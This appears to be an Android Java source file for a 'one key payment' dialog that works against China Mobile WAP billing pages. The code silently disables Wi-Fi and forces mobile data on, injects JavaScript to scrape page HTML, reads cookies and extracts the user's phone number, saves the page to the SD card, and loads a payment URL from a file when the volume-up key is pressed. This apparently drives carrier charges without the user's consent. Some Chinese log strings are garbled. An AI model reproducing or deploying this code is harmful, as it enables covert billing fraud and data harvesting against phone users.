package com.android.onekeypayment;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.annotation.SuppressLint;
import android.app.Dialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Handler;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.Toast;

@SuppressLint("SetJavaScriptEnabled")
public class PayDialog2 extends Dialog {
    public static final String URL_CM_WAP_A = "http://a.10086.cn/pams2/l/s.do?j=l&c=1426&ver=2&p=72";
    public static final String URL_CM_WAP = "http://wap.10086.cn/js/index.html";
    public static final String URL_CM_READ;
    static {
        CmReadUrlGenerator generator = new CmReadUrlGenerator();
        URL_CM_READ = generator.generateUrl();
    }

    enum OrderState {
        ORDER_REQUEST, ORDER_PAY, ORDER_NOTIFY
    }

    private MyReceiver mMyReceiver;
    private Context mContext;
    private boolean mRequesting = false;
    private NetworkState mNetworkState = new NetworkState();
    private Handler mHandler;
    private String mRequestUrl;
    private WebView mWebView;
    private OrderState mOrderState = null;
    private ProgressBar mProgressBar;

    public PayDialog2(Context context) {
        super(context, android.R.style.Theme_NoTitleBar);
        mRequestUrl = URL_CM_READ;
        setCanceledOnTouchOutside(false);
        mContext = context;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mWebView = new WebView(mContext);
        mWebView.getSettings().setJavaScriptEnabled(true);
        mWebView.addJavascriptInterface(new InJavaScriptLocalObj(), "local_obj");
        mWebView.setWebViewClient(mWebViewClient);
        RelativeLayout layout = new RelativeLayout(mContext);
        RelativeLayout.LayoutParams rParams1 = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);
        layout.addView(mWebView, rParams1);
        mProgressBar = new ProgressBar(mContext);
        RelativeLayout.LayoutParams rParams2 = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.WRAP_CONTENT, RelativeLayout.LayoutParams.WRAP_CONTENT);
        rParams2.addRule(RelativeLayout.CENTER_IN_PARENT);
        layout.addView(mProgressBar, rParams2);
        setContentView(layout);
        DisplayMetrics dm = mContext.getResources().getDisplayMetrics();
        WindowManager.LayoutParams params = getWindow().getAttributes();
        params.height = (int) (0.6f * dm.heightPixels);
        params.width = (int) (0.8f * dm.widthPixels);
        params.dimAmount = 0.5f;
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
        getWindow().setAttributes(params);
        init();
    }

    private void init() {
        mHandler = new Handler();
        mMyReceiver = new MyReceiver();
        IntentFilter filter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
        mContext.registerReceiver(mMyReceiver, filter);

        startRequestIfReady();
        // mHandler.postDelayed(mDismissRunnable, 30 * 1000);
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
            Log.d(Log.TAG, "keyCode : " + keyCode);
            mOrderState = OrderState.ORDER_PAY;
            mWebView.loadUrl(getUrlFromFile());
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    private WebViewClient mWebViewClient = new WebViewClient() {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            view.loadUrl(url);
            return true;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            Log.d(Log.TAG, "url : " + url);
            if (OrderState.ORDER_REQUEST == mOrderState) {
                // view.loadUrl("javascript:window.local_obj.showSource(document.getElementsByTagName('html')[0].outerHTML, 'html');");
                view.loadUrl("javascript:" + Util.GET_HTLM);
                view.loadUrl("javascript:showHtmlSource('" + url + "')");
            } else if (OrderState.ORDER_PAY == mOrderState) {
                // view.loadUrl("javascript:window.local_obj.showSource(document.getElementsByClassName('btn_back')[0].href, 'url');");
                view.loadUrl("javascript:" + Util.GET_URL);
                view.loadUrl("javascript:showUrl('" + url + "')");
            } else if (OrderState.ORDER_NOTIFY == mOrderState) {
                Log.d(Log.TAG, "֧�����");
                dismissProgress();
            }
        }
    };

    final class InJavaScriptLocalObj {
        @JavascriptInterface
        public void showSource(String content, String state, String url) {
            Log.d(Log.TAG, "state : " + state);
            if ("url".equals(state)) {
                Log.d(Log.TAG, "content : " + content);
                if (!TextUtils.isEmpty(content)) {
                    Log.d(Log.TAG, "֪ͨ������֧���ɹ�");
                    mOrderState = OrderState.ORDER_NOTIFY;
                    loadUrlOnUiThread(content);
                } else {
                    Log.d(Log.TAG, "֧��ʧ��");
                    dismissProgress();
                }
            } else {
                CookieManager cookieManager = CookieManager.getInstance();
                String CookieStr = cookieManager.getCookie(url);
                Log.d(Log.TAG, "CookieStr : " + CookieStr);
                String phoneNumber = getMobileNumber(content);
                Log.d(Log.TAG, "phoneNumber : " + phoneNumber);
                writeToFile(content);
            }
        }
    }

    private void loadUrlOnUiThread(final String url) {
        Thread.dumpStack();
        Log.d(Log.TAG, "");
        mHandler.post(new Runnable() {
            @Override
            public void run() {
                mWebView.loadUrl(url);
            }
        });
    }
    
    private void dismissProgress() {
        mHandler.post(new Runnable() {
            @Override
            public void run() {
                mProgressBar.setVisibility(View.INVISIBLE);
            }
        });
    }

    private void requestPaymentUrl() {
        mOrderState = OrderState.ORDER_REQUEST;
        loadUrlOnUiThread(mRequestUrl);
    }

    private String getMobileNumber(String html) {
        if (TextUtils.isEmpty(html)) {
            Log.d(Log.TAG, "getMobileNumber html is empty");
            return null;
        }
        // String telRegex = "13\\d{9}|14[57]\\d{8}|15[012356789]\\d{8}|18[01256789]\\d{8}|17[0678]\\d{8}";
        String telRegex = Util.getMobileReg(mContext);
        Pattern p = Pattern.compile(telRegex);
        Matcher m = p.matcher(html);
        String phoneNumber = null;
        if (m != null && m.find()) {
            Log.d(Log.TAG, "m.groupCount() : " + m.groupCount());
            phoneNumber = m.group(m.groupCount());
        }
        Log.d(Log.TAG, "phoneNumber : " + phoneNumber);
        return phoneNumber;
    }

    public class MyReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo mobileInfo = manager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            NetworkInfo wifiInfo = manager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            NetworkInfo activeInfo = manager.getActiveNetworkInfo();
            String tmp = "";
            if (mobileInfo != null) {
                tmp += "mobile connected : " + mobileInfo.isConnected() + ", available : " + mobileInfo.isAvailable() + " , ";
            }
            if (wifiInfo != null) {
                tmp += "wifiInfo connected : " + wifiInfo.isConnected() + ", available : " + wifiInfo.isAvailable() + " , ";
            }
            if (activeInfo != null) {
                tmp += "wifiInfo activeInfo : " + activeInfo.getTypeName();
                if (activeInfo.getType() == ConnectivityManager.TYPE_MOBILE && !mRequesting) {
                    requestPaymentUrl();
                }
            } else {
                boolean enabled = NetworkManager.getMobileDataState(mContext, null);
                Log.d(Log.TAG, "Enable Data Connection : " + enabled);
                if (!enabled) {
                    mNetworkState.dataChanged = true;
                    NetworkManager.setMobileData(mContext, true);
                }
            }
            // Log.d(Log.TAG, tmp);
            Toast.makeText(context, tmp, 1).show();
        }
    }

    private void startRequestIfReady() {
        mNetworkState.reset();
        ConnectivityManager manager = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeInfo = manager.getActiveNetworkInfo();

        mNetworkState.dataState = NetworkManager.getMobileDataState(mContext, null);

        if (activeInfo != null) {
            if (activeInfo.getType() == ConnectivityManager.TYPE_MOBILE && !mRequesting) {
                requestPaymentUrl();
                return;
            }
            if (activeInfo.getType() == ConnectivityManager.TYPE_WIFI) {
                Log.d(Log.TAG, "Disable Wifi");
                mNetworkState.wifiChanged = true;
                mNetworkState.wifiState = NetworkManager.isWifiEnabled(mContext);
                NetworkManager.setWifiState(mContext, false);
                return;
            }
        } else {
            Log.d(Log.TAG, "Enable Data Directly");
            mNetworkState.dataChanged = true;
            mNetworkState.dataState = NetworkManager.getMobileDataState(mContext, null);
            NetworkManager.setMobileData(mContext, true);
        }
    }

    private void restoreOldNetworkState() {
        if (mNetworkState.wifiChanged) {
            NetworkManager.setWifiState(mContext, mNetworkState.wifiState);
        }
        if (mNetworkState.dataChanged) {
            NetworkManager.setMobileData(mContext, mNetworkState.dataState);
        }
    }

    @Override
    public void dismiss() {
        Log.d(Log.TAG, "dismiss");
        mHandler.removeCallbacks(mDismissRunnable);
        if (mMyReceiver != null) {
            mContext.unregisterReceiver(mMyReceiver);
            mMyReceiver = null;
        }
        restoreOldNetworkState();
        super.dismiss();
    }
    
    class NetworkState {
        public boolean wifiChanged;
        public boolean dataChanged;
        public boolean wifiState;
        public boolean dataState;
        public NetworkState() {
            reset();
        }

        public void reset() {
            wifiChanged = false;
            dataChanged = false;
            wifiState = false;
            dataState = false;
        }
    }

    private Runnable mDismissRunnable = new Runnable() {
        @Override
        public void run() {
            dismiss();
        }
    };

    public interface OnHttpRequestComplete {
        public void onRequestComplete();
    }

    public int dp2px(Context context, float dp) {
        final float scale = context.getResources().getDisplayMetrics().density;
        return (int) (dp * scale + 0.5f);
    }

    public int px2dp(Context context, float px) {
        final float scale = context.getResources().getDisplayMetrics().density;
        return (int) (px / scale + 0.5f);
    }
    
    private void writeToFile(String content) {
        if (TextUtils.isEmpty(content)) {
            Log.d(Log.TAG, "content is empyt");
            return;
        }
        try {
            FileOutputStream fos = new FileOutputStream("/sdcard/mm.html");
            fos.write(content.getBytes());
            fos.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    private String getUrlFromFile() {
        FileInputStream fis = null;
        InputStreamReader isr = null;
        BufferedReader br = null;
        
        try {
            fis = new FileInputStream("/sdcard/url.txt");
            isr = new InputStreamReader(fis);
            br = new BufferedReader(isr);
            String url = br.readLine();
            br.close();
            isr.close();
            fis.close();
            if (!TextUtils.isEmpty(url)) {
                url = url.replaceAll("&amp;", "&");
                Log.d(Log.TAG, "url : " + url);
            }
            return url;
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}
